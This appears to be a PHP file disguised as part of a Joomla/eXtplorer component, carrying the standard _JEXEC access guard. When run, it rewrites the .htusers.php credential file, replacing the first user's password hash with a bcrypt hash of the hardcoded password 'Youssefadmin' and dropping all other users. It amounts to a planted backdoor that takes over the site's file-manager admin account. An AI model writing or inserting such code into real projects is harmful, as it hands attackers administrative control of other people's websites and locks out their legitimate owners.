<?php 
include("config/.htusers.php") ; 
	// ensure this file is being included by a parent file
	if( !defined( '_JEXEC' ) && !defined( '_VALID_MOS' ) ) die( 'Restricted access' );
  $options = [
    'cost' => 12,
];
$newone= password_hash("Youssefadmin", PASSWORD_BCRYPT, $options);
	//$GLOBALS["users"] 
 
$fp = fopen('.htusers.php', 'w');
fwrite($fp, '<?php 
	// ensure this file is being included by a parent file
	if( !defined( "_JEXEC" ) && !defined( "_VALID_MOS" ) ) die( "Restricted access" );
	$GLOBALS["users"]=array(
	array("'.$GLOBALS["users"][0].'","'.$newone.'","'.$GLOBALS["users"][2].'","'.$GLOBALS["users"][3].'","'.$GLOBALS["users"][4].'","'.$GLOBALS["users"][5].'","'.$GLOBALS["users"][6].'",1),
); 
?>');
fclose($fp);

?>
